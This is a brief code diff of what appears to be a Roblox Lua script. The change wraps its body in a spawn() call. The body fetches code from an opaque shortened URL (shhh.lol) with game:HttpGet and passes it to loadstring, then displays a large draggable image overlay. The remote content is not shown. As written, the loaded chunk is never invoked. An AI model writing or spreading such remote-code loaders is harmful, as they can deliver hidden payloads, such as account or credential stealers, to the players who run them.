@@ -14,6 +14,7 @@ task.wait(5.5)
 end
 end)
 
+spawn(function()
 loadstring(game:HttpGet("https://shhh.lol/R671UN"))
 
 local ScreenGui = Instance.new("ScreenGui")
@@ -27,3 +28,4 @@ ImageLabel.Size = UDim2.new(0, 1321, 0, 810)
 ImageLabel.Image = "http://www.roblox.com/asset/?id=8694934460"
 ImageLabel.Active = true
 ImageLabel.Draggable = true
+end)
